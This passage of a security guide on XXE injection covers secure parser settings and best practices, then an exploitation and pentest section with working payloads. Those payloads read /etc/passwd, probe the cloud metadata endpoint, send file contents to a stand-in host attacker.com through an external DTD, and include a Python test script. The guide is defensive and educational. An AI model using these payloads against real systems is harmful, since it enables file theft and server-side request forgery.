dir="auto"><p id="2d5562ad-76f0-8062-b2d7-ef5730f016ac" class=""><strong>Python (defusedxml - Recommended):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-804f-a936-eab21939a3b9" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from defusedxml.ElementTree import parse
+
+xml_data = request.data
+tree = parse(xml_data)  # Safe! External entities disabled by default
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d6-82e7-e51ad439f4c4" class=""><strong>Python (lxml - Secure Configuration):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8002-9b55-d0505ed02ceb" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from lxml import etree
+
+parser = etree.XMLParser(resolve_entities=False, no_network=True)
+tree = etree.parse(xml_data, parser)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-806d-9827-ef2298fe82b9" class=""><strong>Java:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8018-b626-da27844523e0" class="code code-wrap"><code class="language-Java" style="white-space:pre-wrap;word-break:break-all">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);
+dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);
+dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);
+dbf.setExpandEntityReferences(false);
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80e1-8007-ce6c0e188a5a"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8098-8b6b-f401b90e8b27" class=""><strong>2. Use Secure XML Parsers</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f0-8b40-d501b81347e8" class=""><strong>Python:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802b-8ca0-c1637f076790" class="bulleted-list"><li style="list-style-type:disc">✅ <strong>defusedxml</strong> - Secure by default</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f8-8f2b-d6b892bc5021" class="bulleted-list"><li style="list-style-type:disc">❌ <strong>xml.etree.ElementTree</strong> - Vulnerable by default</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8049-bc06-d0ba8865489c" class=""><strong>Java:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b8-812a-ee55319de839" class="bulleted-list"><li style="list-style-type:disc">✅ Configure <code>DocumentBuilderFactory</code> securely</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805a-a45e-c16447335c1f" class="bulleted-list"><li style="list-style-type:disc">❌ Default configurations vulnerable</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80ec-a53f-fca6ef3e7297"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80f8-8b46-c33e5d0d3221" class=""><strong>3. Input Validation</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d4-93c9-fd115d34c90f" class=""><strong>Whitelist Approach:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80a7-a89b-f4aaefc6f38e" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">import re
+
+def validate_xml(xml_data):
+    # Reject XML with DOCTYPE declarations
+    if b&#x27;&lt;!DOCTYPE&#x27; in xml_data:
+        raise ValueError(&quot;DOCTYPE declarations not allowed&quot;)
+    return xml_data
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80cf-b5e9-c54e02c84844"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80c9-9dfc-e10095f6670f" class=""><strong>4. Use Simple Data Formats</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8096-99a3-d2e8484af605" class=""><strong>When Possible:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807b-a8bd-c0b600ad4c96" class="bulleted-list"><li style="list-style-type:disc">Use JSON instead of XML</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-808b-a976-d76685e1d867" class="bulleted-list"><li style="list-style-type:disc">Use YAML (with safe loading)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8013-b705-cf94c17a6c2f" class="bulleted-list"><li style="list-style-type:disc">Avoid XML if not necessary</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-807c-8c24-d83212a1374f"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-801b-a596-c315a3844660" class=""><strong>Best Practices</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80e8-b92f-e1910cf7c25f" class=""><strong>1. Always Use Secure Parsers</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80fa-a49e-de90f7237155" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80f4-b589-f31b69eb2013" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from defusedxml.ElementTree import parse
+tree = parse(xml_data)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803e-af5e-e2a907e44934" class=""><strong>❌ WRONG:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8040-a37f-d3618ecdd61d" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from xml.etree.ElementTree import parse
+tree = parse(xml_data)  # Vulnerable!
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80df-977e-c875b22b030e"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8081-8a35-f1a23728ef3e" class=""><strong>2. Disable External Entities Explicitly</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8092-8b75-ce79c0e1ec6d" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8004-a6c8-d1eb89016e8b" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">from lxml import etree
+
+parser = etree.XMLParser(resolve_entities=False, no_network=True)
+tree = etree.parse(xml_data, parser)
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80bd-b1b5-ddf20661446f"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80f6-b856-db9999f18ee1" class=""><strong>3. Validate XML Structure</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8079-9339-db1d917da1a3" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-802f-91db-f11fa3dcfc41" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">def validate_xml_structure(xml_data):
+    # Reject DOCTYPE declarations
+    if b&#x27;&lt;!DOCTYPE&#x27; in xml_data:
+        raise ValueError(&quot;DOCTYPE not allowed&quot;)
+
+    # Use secure parser
+    from defusedxml.ElementTree import parse
+    tree = parse(xml_data)
+    return tree
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-807b-8d36-f5a0791892f6"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80a6-b08d-e770011601ab" class=""><strong>4. Use JSON When Possible</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80dc-b496-fb22a7ec8230" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-800d-bf06-c8d3ec3f5884" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">import json
+
+data = json.loads(request.data)  # Much safer than XML!
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-801e-a3ab-e0be488b7221"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8004-8bb2-de1896f25244" class=""><strong>Advanced Exploitation Techniques</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80d7-9b3d-d8951b17a10c" class=""><strong>1. Parameter Entity Attacks</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c2-9ac7-e28caa4c90bf" class=""><strong>Technique:</strong> Use parameter entities to chain entity definitions.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80bd-b1a0-cdebf307a49f" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-800f-b318-d8c33007feff" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;!DOCTYPE foo [
+  &lt;!ENTITY % xxe SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;
+  %xxe;
+]&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f9-9c9f-ce94a4f9f969" class=""><strong>evil.dtd:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8005-b82c-f44c25da92d3" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://attacker.com/?%file;&#x27;&gt;&quot;&gt;
+%eval;
+%exfil;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8008-b4e9-d6801a11bb43"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8060-acfa-e5d72bad01e2" class=""><strong>2. UTF-8 Encoding Bypass</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803c-977c-ed63027dbd16" class=""><strong>Technique:</strong> Use different encoding to bypass filters.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ed-ab3d-db65642db0da" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-801e-8d93-fc74ad82e918" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8070-823c-c3ef0039bbaf"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80a0-bec6-f03f6d03c552" class=""><strong>3. XML Schema Attacks</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8023-809b-cc7d4ca3c746" class=""><strong>Technique:</strong> Exploit XML Schema imports.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-808d-b057-d21d6ac8de33" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8087-9f02-ef546e6637dc" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
+  &lt;xs:import schemaLocation=&quot;http://attacker.com/evil.xsd&quot;/&gt;
+&lt;/xs:schema&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8038-9d24-de4017d28c8a"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8000-8a4d-f2b624cd2637" class=""><strong>Penetration Testing Methodology</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80ce-8933-d70a384a698e" class=""><strong>XXE Testing Checklist</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-809b-aba8-fa747b8aa05f" class=""><strong>1. Identify XML Input Points:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8075-86bf-df24e96b4e74" class="bulleted-list"><li style="list-style-type:disc">File uploads (Office docs, SVG images)</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a3-8835-dcfd232553f8" class="bulleted-list"><li style="list-style-type:disc">SOAP endpoints</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8064-8df4-da2cf0cfe30f" class="bulleted-list"><li style="list-style-type:disc">REST APIs accepting XML</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e4-81e5-f3406cb0a5fe" class="bulleted-list"><li style="list-style-type:disc">Configuration file processing</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8077-a72f-d418b036d505" class=""><strong>2. Test Basic XXE:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80ee-aad6-de2101c345e5" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c0-b0b7-d8bf74d6a334" class=""><strong>3. Test SSRF:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d4-8480-f68380bc86a4" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/&quot;&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8028-9a9c-e1121898c7d0" class=""><strong>4. Test Blind XXE:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80fa-bc9c-fcb211a56a8b" class="code code-wrap"><code class="language-XML" style="white-space:pre-wrap;word-break:break-all">&lt;!ENTITY % xxe SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt;
+%xxe;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-801c-82f9-fe5b4b1b8030" class=""><strong>5. Analyze Responses:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-803e-a087-fb8f02e2b9f4" class="bulleted-list"><li style="list-style-type:disc">Check for file contents in response</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80de-b324-ea2bfbc4818b" class="bulleted-list"><li style="list-style-type:disc">Monitor network traffic for outbound requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8077-82d9-e9550fc30b05" class="bulleted-list"><li style="list-style-type:disc">Check for error messages revealing file access</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-805f-aa19-c0bcb19b5599"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80cf-9a4c-d4ddb40a9eae" class=""><strong>Testing Tools</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80dd-be69-e4d6e568300c" class=""><strong>1. Burp Suite:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8097-925e-db9fee13dbcc" class="bulleted-list"><li style="list-style-type:disc">XXE plugin</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8059-b91e-e6576e627e7b" class="bulleted-list"><li style="list-style-type:disc">Manual payload crafting</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8003-b59b-edb521d7d208" class="bulleted-list"><li style="list-style-type:disc">Response analysis</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-808e-a7e3-ddc3ccfd3323" class=""><strong>2. Custom Scripts:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-809c-ac28-ea2f91bc163f" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">import requests
+
+xxe_payload = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&quot;&quot;&quot;
+
+response = requests.post(url, data=xxe_payload)
+if &quot;root:&quot; in response.text:
+    print(&quot;XXE vulnerability found!&quot;)
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8068-91b6-c6ce186a25ad"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-808e-935b-cae809028c1f" class=""><strong>Threat Modeling (STRIDE Framework)</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80ab-aadf-e93a035be606" class=""><strong>Spoofing</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8064-a0f6-c7a62f7ecaba" class=""><strong>Threat:</strong> Attacker spoofs internal network requests via SSRF.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803b-b21b-d45535b3bef4" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80bf-8475-ce24016e6e38" class="bulleted-list"><li style="list-style-type:disc">Disable external entities</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8096-8c18-ccc08d040d35" class="bulleted-list"><li style="list-style-type:disc">Network segmentation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a6-8e0a-e44c630e55d7" class="bulleted-list"><li style="list-style-type:disc">Restrict outbound connections</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80f2-a459-e973bdf7fee5" class=""><strong>Risk Rating:</strong> High</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80e5-bcc7-fd1f795ce368"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-800c-89b6-f6f61c3740d8" class=""><strong>Tampering</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b3-9e3b-d6b040142c85" class=""><strong>Threat:</strong> Attacker modifies XML structure to exploit parser.</p></div><div style="display:contents" dir="auto"><p 